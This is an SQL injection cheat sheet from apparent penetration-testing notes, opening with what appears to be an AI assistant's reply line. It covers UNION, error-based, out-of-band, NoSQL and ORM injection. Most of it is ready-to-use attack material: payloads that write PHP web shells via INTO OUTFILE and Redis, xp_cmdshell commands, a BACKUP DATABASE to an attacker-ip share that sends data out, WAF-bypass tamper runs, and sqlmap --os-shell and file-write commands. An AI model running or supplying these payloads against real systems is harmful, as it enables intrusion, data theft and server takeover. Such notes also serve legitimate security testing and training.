+++
title = 'SQL Injection (SQLi)'
date = 2026-10-30
type = 'notes'
weight = 60
toc = true
tags = ['web', 'web-attacks', 'sql-injection']
+++

Here is the revised and expanded **SQL Injection (SQLi)** reference. Your original payloads, filter-evasion tables, SQLMap commands, and field notes are preserved. The major additions are the **2025–2026 WAF-evasion research** (AST mutation, adversarial generation), **NoSQL injection** (MongoDB operator injection, Redis, Cassandra), **ORM-level injection** (Hibernate CVE-2026-0603, Sequelize), **modern SQLMap tamper collections**, **out-of-band and error-based refinements**, and **current critical CVEs**.

---


SQL injection allows an attacker to interfere with the queries an application makes to its database. It can expose data belonging to other users, modify or delete data, escalate to server compromise, or cause denial of service.

> **Source:** [PortSwigger — SQL Injection](https://portswigger.net/web-security/sql-injection)

**2025–2026 context:** SQLi is no longer just string concatenation in PHP. It now lives in **ORM bulk strategies** (Hibernate CVE-2026-0603), **AI/vector-store query builders** (Spring AI PgVectorStore), **NoSQL operator injection** (MongoDB `$ne`, `$where`), and **GraphQL resolvers**. WAF evasion has moved from hand-written obfuscation to **AST-guided mutation** and **adversarial generation** that produces semantically equivalent payloads the signature rules do not match.

---

## 1. Useful Resources

- [PortSwigger SQLi Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [HackTricks — SQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection)
- [Invicti NoSQL Injection Cheat Sheet](https://www.invicti.com/blog/web-security/nosql-injection-cheat-sheet) — MongoDB, Redis, CouchDB, Cassandra, Mongoose
- [sqlmap-tamper-collection](https://github.com/regaan/sqlmap-tamper-collection) — WAF-specific tamper scripts (2026)

---

## 2. Finding a SQLi Attack Vector

Whenever faced with user input, test with the following. In some cases the injection is **blind** — no error messages are returned.

```
'
"
`
')
")
`)
'))
"))
`))
OR 1=1
OR 1=1 -- //
```

> **Caution:** Injecting `OR 1=1` can be dangerous. Applications often reuse data from a single request across multiple queries — if the condition reaches an `UPDATE` or `DELETE`, it can cause unintended data loss.

---

## 3. SQL Injection Filter Evasion — Unicode Normalization

Unicode normalization standardizes different binary representations of characters. If the backend normalizes input **after** filtering, a normalization-equivalent character can bypass the WAF.

| Character | Unicode Normalization |
|---|---|
| `o` | `%e1%b4%bc` |
| `r` | `%e1%b4%bf` |
| `1` | `%c2%b9` |
| `=` | `%e2%81%bc` |
| `/` | `%ef%bc%8f` |
| `-` | `%ef%b9%a3` |
| `#` | `%ef%b9%9f` |
| `*` | `%ef%b9%a1` |
| `'` | `%ef%bc%87` |
| `"` | `%ef%bc%82` |
| `\|` | `%ef%bd%9c` |

**References:**

- [AppCheck — Unicode Normalization Vulnerabilities](https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/)
- [Normalization table](https://0xacb.com/normalization_table)

---

## 4. UNION-Based SQL Injection Payloads

| Payload | Description |
|---|---|
| `' order by 1-- -` | Detect column count via `ORDER BY` |
| `cn' UNION select 1,2,3-- -` | Detect column count via `UNION` |
| `cn' UNION select 1,@@version,3,4-- -` | Basic UNION injection |
| `UNION select username, 2, 3, 4 from passwords-- -` | UNION injection for 4 columns |
| `cn' UNION select 1,database(),2,3-- -` | Current database name |
| `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -` | List all databases |
| `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -` | List tables in a database |
| `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -` | List columns in a table |
| `cn' UNION select 1, username, password, 4 from dev.credentials-- -` | Dump data from another database |
| `cn' UNION SELECT 1, user(), 3, 4-- -` | Current user |
| `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -` | Check for admin privileges |
| `cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee LIKE "'root'@%"-- -` | Current user privileges |
| `cn' UNION SELECT 1, @@secure_file_priv, 3, 4-- -` | File import/export directory (MySQL) |
| `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM performance_schema.global_variables WHERE variable_name="secure_file_priv"-- -` | Same, for MySQL 8 |
| `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -` | Read a local file |
| `select 'file written successfully!' into outfile '/var/www/html/proof.txt'` | Write a string to a file |
| `cn' union select "",'<?php system($_GET["cmd"]); ?>',"","" into outfile '/var/www/html/shell.php'-- -` | Write a web shell |

---

## 5. Authentication Bypass Payloads

```
' or 1=1 limit 1 -- -+
' or 'x'='x
" or "x"="x
admin' --
admin' or '1'='1
admin' or '1'='1'--
admin' or '1'='1'#
admin' or '1'='1'/*
admin') or ('1'='1
admin') or ('1'='1'--
admin" or "1"="1
admin" or "1"="1"--
admin" or "1"="1"#
admin") or ("1"="1
admin") or ("1"="1"--
1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055
```

---

## 6. MSSQL Generic Payloads

```
; --
'; --
'); --
'; exec master..xp_cmdshell 'ping 10.10.1.2'--
' or 1=1 --
' union (select @@version) --
'; if not(substring((select @@version),25,1) <> 0) waitfor delay '0:0:2' --
'; if is_srvrolemember('sysadmin') > 0 waitfor delay '0:0:2' --
select @@version
exec master..xp_cmdshell 'ipconfig /all'
BACKUP DATABASE master TO DISK = '\\<attacker-ip>\share\backupdb.dat'-- -
CREATE TABLE myfile (line varchar(8000)); BULK INSERT myfile FROM 'c:\inetpub\wwwroot\auth.asp' WITH (FIELDTERMINATOR='\n'); SELECT * FROM myfile-- -
```

---

## 7. Error-Based and Out-of-Band Techniques

### 7.1 Error-based extraction

When the application reflects database errors, `extractvalue()` and `updatexml()` force data into the error message:

```sql
' AND extractvalue(1,concat(0x7e,(SELECT user()),0x7e))-- -
```

This returns the current database user in the error text. Error-based techniques are **fast and reliable** when error output is available.

### 7.2 Out-of-band (OOB) exfiltration

When the response channel carries no useful signal, OOB injection uses the database to make an **outbound DNS or HTTP request** carrying the data.

| Database | OOB primitive |
|---|---|
| **MySQL** | `LOAD_FILE()` with a UNC path, or `INTO OUTFILE` to a WebDAV path |
| **MSSQL** | `xp_dirtree` / `xp_fileexist` with a UNC path — leaks Net-NTLMv2 |
| **Oracle** | `UTL_HTTP.REQUEST`, `UTL_INADDR.GET_HOST_ADDRESS`, `HTTPURITYPE` |
| **PostgreSQL** | `COPY ... FROM PROGRAM`, `dblink` |

OOB techniques are **slower but reliable** in environments with strict response normalization.

### 7.3 Converting blind errors into boolean extraction (Oracle)

When standard boolean, time-based, UNION, and OOB techniques all fail, the `DECODE` function can convert a blind error-based injection into an exploitable boolean one — because `DECODE` returns a value of the data type of its first result, which can be used to trigger a distinguishable error condition.

---

## 8. WAF Evasion (2025–2026)

WAF bypass has moved beyond hand-written obfuscation. The current research focuses on **semantic-preserving mutation** — changing the payload's syntax without changing its meaning, so signature rules that match the original form do not fire.

### 8.1 AST-guided mutation — Vast-SQLi (2026)

Vast-SQLi encodes payloads as **abstract syntax trees**, applies **structure-aware rewrites**, and uses reinforcement learning with constraint-guided objectives to generate valid payloads **without handcrafted obfuscation rules**. Evaluated on eight WAFs, it improves bypass success by **27.43%** over raw inputs and surpasses prior state-of-the-art methods.

### 8.2 Adversarial mutation — BWAFSQLi (2026)

BWAFSQLi applies **26 rules with 15 mutation strategies**, including two novel techniques — **Quotation Mark Encoding** and **Comment Extension** — to produce **semantic-equivalent** mutations. It increased WAF false-negative rates by up to **93.39%** (gray-box) and **58.49%** (black-box).

### 8.3 Practical bypass primitives

| Technique | Example |
|---|---|
| **Version-comment wrapping** | `SELECT` → `/*!50000SELECT*/` |
| **Space replacement** | `' '` → `/**/` |
| **Case alternation** | `SELECT` → `sElEcT` |
| **Quotation mark encoding** | Encode quotes as their Unicode equivalents |
| **Comment extension** | Insert benign comments to break signature tokens |
| **Homoglyph substitution** | Unicode lookalikes for keywords |
| **Numeric obfuscation** | Hex, float, and mathematical equivalents for numbers |
| **Logical operator swap** | `AND`/`OR` → `&&`/`\|\|` |

### 8.4 SQLMap tamper collections (2026)

The community tamper collection targets **Cloudflare, AWS WAF, Azure WAF, and Akamai** with context-aware transformations:

- **Cloudflare 2025** — multi-layer: version comments, inline-comment spaces, URL-encoded operators, alternating case
- **AWS WAF 2026** — hex encoding, `&&`/`||` logical swaps
- **Azure WAF 2026** — token-aware transformations
- **Akamai 2026** — v2.1.0 adds six WAF scripts and seven transformations

```bash
# Install a tamper script
cp tamper_scripts/cloudflare2025.py /path/to/sqlmap/tamper/

# Use it
sqlmap -u "https://target.com?id=1" --tamper=cloudflare2025
```

> **SQLMap 1.10 (2026-01-01)** added new tampering scripts that avoid popular WAF/IPS mechanisms, and **1.9 (2025-01-02)** stabilised several inference engines.

### 8.5 LLM-generated adversarial payloads

**RADAGAS** (LLM-based adversarial generation) achieved a **22.73% bypass rate** overall and **92.49% on WAF-Brain** — demonstrating that AI-generated payloads are effective against AI/ML-based WAFs.

---

## 9. NoSQL Injection (2025–2026)

NoSQL injection targets the query API and operators of non-relational databases. Unlike SQL, where payloads are often portable across engines, **most NoSQL techniques are database-specific** — the attack surface depends entirely on the target database.

### 9.1 MongoDB — operator injection

MongoDB's query language accepts **operators as JSON keys**. If the application passes user input directly into a query object without type validation, an attacker can inject operators.

**Syntax-breaking tests** — send to any input that might reach a NoSQL query:

```
' " \ { } [ ] ; $
```

**Operator injection detection:**

```http
# URL-encoded form parameters
param[$ne]=xyz
param[$gt]=
param[$regex]=.*

# JSON request bodies
{"param": {"$ne": null}}
{"param": {"$gt": ""}}
{"param": {"$regex": ".*"}}
```

If any of these change the application's behaviour compared to a normal string value, the input is very likely forwarded into a query without type checking.

**Authentication bypass:**

```json
{"username": {"$ne": null}, "password": {"$ne": null}}
```

This matches any user whose username and password are **not null** — effectively logging in as the first user in the collection.

**Blind extraction with `$regex`:**

```json
{"username": "admin", "password": {"$regex": "^a"}}
```

Iterate the regex character by character to extract the password.

**JavaScript injection with `$where`:**

```json
{"$where": "this.username == 'admin' && this.password.match(/^a/)"}
```

### 9.2 Redis — command injection

Redis does not use a query language — it accepts **commands**. If the application concatenates user input into a command, inject:

```
FLUSHALL
CONFIG SET dir /var/www/html
CONFIG SET dbfilename shell.php
SET x "<?php system($_GET['c']); ?>"
SAVE
```

This writes a PHP web shell to the webroot.

### 9.3 Other NoSQL engines

| Engine | Injection primitive |
|---|---|
| **Cassandra** | CQL injection — string concatenation in `SELECT` / `ALLOW FILTERING` |
| **Elasticsearch** | Query DSL injection — unsanitized JSON in `query` |
| **CouchDB** | `$where` / view injection |

### 9.4 Tooling

| Tool | What it does |
|---|---|
| **nosql-scanner** | Multi-database scanner — MongoDB, Redis, Cassandra, Elasticsearch; **150+ payloads**; blind timing; operator injection; HTML reports |
| **nosqli** | CLI scanner focused on NoSQL injection across parameterized endpoints |
| **Burp NoSQLi** | Burp extension for operator injection |

> **Choose by backend:** use `sqlmap` for SQL databases; use `nosqli`/`nosql-scanner` for NoSQL. They are not interchangeable.

### 9.5 CVE-2026-54350 — Budibase unauthenticated NoSQL operator injection

An unauthenticated attacker can **dump or mass-modify an entire collection** via a **public query**, with no session, using only the public `x-budibase-app-id` header. This is a full read/write NoSQL injection with zero authentication.

---

## 10. ORM-Level Injection (2025–2026)

ORMs reduce SQLi but do not eliminate it. The injection moves to **bulk strategies**, **sort/filter parameters**, and **vector-store query builders**.

### 10.1 Hibernate second-order bulk-ID injection — CVE-2026-0603

A second-order SQL injection in Hibernate ORM when an application explicitly opts into the **`InlineIdsOrClauseBulkIdStrategy`**. If an attacker can craft a **primary key containing malicious SQL** and this optimisation is active, it leads to unintended SQL execution — including mass deletion.

**Affected configuration:**

```
hibernate.hql.bulk_id_strategy =
  org.hibernate.hql.spi.id.inline.InlineIdsOrClauseBulkIdStrategy
```

**Fixed:** Hibernate 6.0 rewrote the query construction engine and removed `InlineIdsOrClauseBuilder`. Upgrade to 5.3.38+ or 6.x.

> **Spring note:** this is **not** a Spring Framework or Spring Data JPA vulnerability — it is a configuration-dependent issue in a third-party dependency. Applications that do not set this strategy are not vulnerable.

### 10.2 Hibernate HQL `ORDER BY` injection — CVE-2026-4594 (erupt)

The `geneEruptHqlOrderBy` function in erupt 1.13.3 and earlier passes the `sort.field` argument directly into an HQL `ORDER BY` clause. Because `ORDER BY` cannot be parameterised, this is a **Hibernate SQL injection** reachable remotely. Public exploit code exists.

### 10.3 Sequelize / MikroORM (2026)

Research documents ORM injection across **Sequelize, Hibernate, and MikroORM** — the common pattern is an ORM API that accepts a **column name or sort direction** from user input and concatenates it into the query, because parameterisation does not apply to identifiers.

### 10.4 Spring AI vector-store injection

`PgVectorStore` and `CouchbaseSearchVectorStore` concatenate `FilterExpressionBuilder` output **directly into SQL without parameterisation**, enabling **tenant isolation bypass**:

```
key=tenant'::jsonpath OR true OR metadata::jsonb @@ '$.tenant
```

This returns documents from **all tenants**, not just the caller's.

---

## 11. Second-Order SQLi

Second-order (stored) SQLi occurs when user input is **stored safely** — typically through a parameterised `INSERT` — but later **incorporated unsafely** into a query elsewhere in the application, where the developer assumed the data was trusted because it came from their own database.

**Classic scenario:**

1. Register with the username `admin'--`. The `INSERT` is parameterised, so the username is stored literally.
2. A password-change function retrieves the username from the database and builds a dynamic `UPDATE`:
   ```sql
   UPDATE users SET password='...' WHERE username='admin'--'
   ```
3. The stored payload fires — the attacker may change the **admin** password rather than their own.

**Testing for second-order injection requires tracing data flow across the application, not probing individual endpoints.** Automated scanners rarely catch it because they cannot model the multi-step flow; manual testing and code review are the most reliable detection methods.

**SQLMap second-order syntax:**

```bash
sqlmap -r req --batch --dump --risk 3 --level 5 \
  --second-req req2 --dbms=mysql --tamper=space2comment
```

---

## 12. SQLMap — Updated Reference

### 12.1 Core commands

| Command | Description |
|---|---|
| `sqlmap -u "http://target/vuln.php?id=1" --batch` | Non-interactive run |
| `sqlmap 'http://target/' --data 'uid=1&name=test'` | POST request |
| `sqlmap 'http://target/' --data 'uid=1*&name=test'` | Mark the injection point with `*` |
| `sqlmap -r req.txt` | Load a saved HTTP request |
| `sqlmap -u "http://target/" --cookie='PHPSESSID=...'` | Specify a cookie |
| `sqlmap -u target --data='id=1' --method PUT` | PUT request |
| `sqlmap -u "http://target/?id=1" --prefix="%'))" --suffix="-- -"` | Prefix/suffix for closed quotes |
| `sqlmap -u target/?id=1 --level=5 --risk=3` | Maximum test coverage |
| `sqlmap -u target --banner --current-user --current-db --is-dba` | Basic DB enumeration |
| `sqlmap -u target --tables -D testdb` | Enumerate tables |
| `sqlmap -u target --dump -T users -D testdb -C name,surname` | Dump specific columns |
| `sqlmap -u target --dump -T users -D testdb --where="name LIKE 'f%'"` | Conditional dump |
| `sqlmap -u target --schema` | Enumerate schema |
| `sqlmap -u target --search -T user` | Search for a table |
| `sqlmap -u target --passwords --batch` | Dump and crack password hashes |
| `sqlmap -u target --csrf-token="csrf-token"` | Anti-CSRF token bypass |
| `sqlmap --list-tampers` | List all tamper scripts |
| `sqlmap -u target --is-dba` | Check DBA privileges |
| `sqlmap -u target --file-read "/etc/passwd"` | Read a local file |
| `sqlmap -u target --file-write "shell.php" --file-dest "/var/www/html/shell.php"` | Write a file |
| `sqlmap -u target --os-shell` | OS shell |

### 12.2 Version changes

- **1.10 (2026-01-01)** — new tampering scripts avoiding popular WAF/IPS; fixes for 302 redirects; WebSocket request traffic logging
- **1.9 (2025-01-02)** — inference-engine stabilisation; DNS-leak fix in Tor mode

### 12.3 NoSQL extension

`nosql-scanner` is a **SQLMap module** for NoSQL — MongoDB, Redis, Cassandra, Elasticsearch — with **150+ payloads**, async support, blind timing, and HTML reports. It is not a replacement for `sqlmap`; it extends it to the NoSQL backend.

---

## 13. Real-World SQLi CVEs (2025–2026)

| CVE / Advisory | Product | Primitive |
|---|---|---|
| **CVE-2026-47296** | Microsoft SQL Server 2016–2025 | SQL Command Parser injection; authenticated attacker can elevate privileges over the network |
| **CVE-2026-0603** | Hibernate ORM | Second-order injection via `InlineIdsOrClauseBulkIdStrategy` |
| **CVE-2026-4594** | erupt ≤ 1.13.3 | HQL `ORDER BY` injection via `sort.field` |
| **CVE-2026-55208** | Pimcore Studio | Column-filter SQL injection |
| **CVE-2026-33944** | Dolibarr 23.0.0 | `localtax1_value` / `localtax2_value` injection |
| **CVE-2025-65125** | online-movie-booking | `movie_details.php` injection |
| **CVE-2025-41008** | SinTurno | SQL injection, critical severity |
| **CVE-2026-54350** | Budibase | Unauthenticated NoSQL operator injection — full collection read/write |
| **Spring AI PgVectorStore** | Spring AI | Tenant-isolation bypass via unparameterised filter expression |
| **Dromara MaxKey 3.5.13** | MaxKey | MyBatis `${}` interpolation bypasses `checkSqlInjection()` blocklist |

> **The common pattern:** authentication is present, the framework is modern, and the injection still exists because a **non-parameterisable position** — `ORDER BY`, a bulk-ID strategy, a JSON path, or a vector-store filter — was built from user input.

---

## 14. Testing Methodology

```bash
# 1. Identify every input that reaches a query
#    URL · body · headers · cookies · JSON · GraphQL · WebSocket · file names

# 2. Send syntax-breaking characters
' " ` \ { } [ ] ; $

# 3. Classify the injection type
#    - Error-based  → extractvalue / updatexml (MySQL), CAST (MSSQL)
#    - UNION        → ORDER BY to count columns, then UNION SELECT
#    - Boolean      → AND 1=1 vs AND 1=2, compare response
#    - Time-based   → SLEEP(5) / WAITFOR DELAY / pg_sleep
#    - OOB          → xp_dirtree, LOAD_FILE, UTL_HTTP

# 4. If the backend is NoSQL, switch operators
#    param[$ne]=xyz · {"$ne": null} · {"$regex": "^a"}

# 5. If an ORM is in use, test the non-parameterisable positions
#    sort.field · order · column · direction · filter expression

# 6. If a WAF blocks the payload, apply tamper scripts
sqlmap --tamper=cloudflare2025,space2comment,randomcase

# 7. If the injection is second-order, register a payload and trace every
#    feature that later reads the stored value

# 8. Chain: SQLi → file write → web shell → OS command
```

---

## 15. Field Notes from the HTB List

- **Rate-based WAFs, not signature WAFs.** Jarvis bans your IP to a redirect page after too many requests; `sqlmap --delay=2 --random-agent` works, while fast tooling gets blocked while manual injection still succeeds.
- **SQLi as a write primitive.** Stacked `INSERT` into a job/cron table gets code execution without a web shell (Connected); `INTO OUTFILE` needs `File_priv=Y` and the shell string in a string column (Jarvis).
- **phpMyAdmin 4.8.0 session include:** `target=db_sql.php%3f/../../../../var/lib/php/sessions/sess_<PHPSESSID>` — the encoded `?` truncates the include path (Jarvis).
- **Turn blind SQLi into a boolean/UNION dump** with `--prefix` + `--code` instead of waiting on time-based queries (Cctv).
- **Injection points are not always obvious:** JSON `path` (Mentor), `xp_dirtree` via stacked query for Net-NTLMv2 (Querier/Giddy), `brand` parameter (Connected).
- **NoSQL is a separate backend.** If the application uses MongoDB, `sqlmap` will not find it — switch to `nosqli` or `nosql-scanner`.
- **ORM injection lives in identifiers, not values.** `ORDER BY`, bulk-ID strategies, and vector-store filters cannot be parameterised — they are the gaps CVE-2026-0603 and the Spring AI bug exploit.
- **Second-order injection bypasses parameterised queries.** The `INSERT` is safe; the `UPDATE` that reads the stored value is not.

Full context: [HTB Linux machines](/notes/oscp-labs/linux/).

---

## 16. Quick Reference — 2025–2026 Additions

| Technique / CVE | Type | What it adds |
|---|---|---|
| **Vast-SQLi** | WAF evasion | AST-guided mutation, 27.43% improvement |
| **BWAFSQLi** | WAF evasion | 26 rules, 15 strategies, Quotation Mark Encoding |
| **sqlmap-tamper-collection** | Tool | Cloudflare 2025, AWS WAF 2026, Azure WAF, Akamai |
| **SQLMap 1.10** | Tool | New tampering scripts, WebSocket logging |
| **nosql-scanner** | Tool | MongoDB, Redis, Cassandra, Elasticsearch, 150+ payloads |
| **CVE-2026-0603** | ORM | Hibernate second-order bulk-ID injection |
| **CVE-2026-4594** | ORM | erupt HQL `ORDER BY` injection |
| **Spring AI PgVectorStore** | ORM | Tenant-isolation bypass via filter expression |
| **CVE-2026-54350** | NoSQL | Budibase unauthenticated operator injection |
| **CVE-2026-47296** | DBMS | Microsoft SQL Server SQL Command Parser injection |
| **RADAGAS** | AI | LLM-generated adversarial payloads, 92.49% on WAF-Brain |

---

This file sits alongside the **NoSQL** and **ORM** sections in the broader web notes: SQLi is the entry point, and the modern variants — operator injection, bulk-ID strategies, vector-store filters — are where the current exploitable surface lives.
